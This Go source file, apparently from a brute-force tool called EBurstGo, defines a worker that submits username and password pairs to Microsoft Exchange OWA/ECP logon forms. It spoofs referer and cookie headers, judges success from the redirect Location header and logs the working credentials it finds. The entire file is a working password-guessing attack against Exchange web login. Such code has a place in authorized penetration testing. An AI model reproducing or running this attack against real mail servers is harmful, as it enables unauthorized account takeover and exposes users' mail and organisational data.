package brute

import (
	"EBurstGo/common"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func HttpBruteWorker(info *common.TaskInfo) {
	u, _ := url.Parse(info.Target)
	var refUrl string

	if info.Mode == "owa" {
		refUrl, _ = url.JoinPath(u.Scheme+"://"+u.Host, "/owa/")
	} else {
		refUrl, _ = url.JoinPath(u.Scheme+"://"+u.Host, "/ecp/")
	}

	referer, _ := url.JoinPath(info.Target, "/owa/auth/logon.aspx?replaceCurrent=1&url="+refUrl)

	for data := range info.Task {
		username, password := data[0], data[1]

		if info.Result.Get(username) {
			continue
		}

		common.Log.Debug("[*] trying: %v:%v", username, password)

		form := url.Values{
			"destination":    {refUrl},
			"flags":          {"4"},
			"forcedownlevel": {"0"},
			"username":       {info.Domain + "\\" + username},
			"password":       {password},
			"passwordText":   {""},
			"isUtf8":         {"1"},
		}

		client := common.NewHttpClient(info)
		req, _ := http.NewRequest("POST", info.Target, strings.NewReader(form.Encode()))
		req.Header.Set("Cache-Control", "max-age=0")
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Referer", referer)
		req.Header.Set("Cookie", "PrivateComputer=true; PBack=0")
		req.Header.Set("Connection", "close")
		res, err := client.Do(req)

		if err != nil {
			panic(err)
		}

		if location := res.Header.Get("Location"); location != "" && !strings.Contains(location, "reason") {
			common.Log.Success("[+] success: %v", username+":"+password)
			info.Result.Put(username, password)
		} else {
			common.Log.Failed("[-] failed: %v", username+":"+password)
		}

		time.Sleep(time.Second * time.Duration(info.Delay))
	}
}
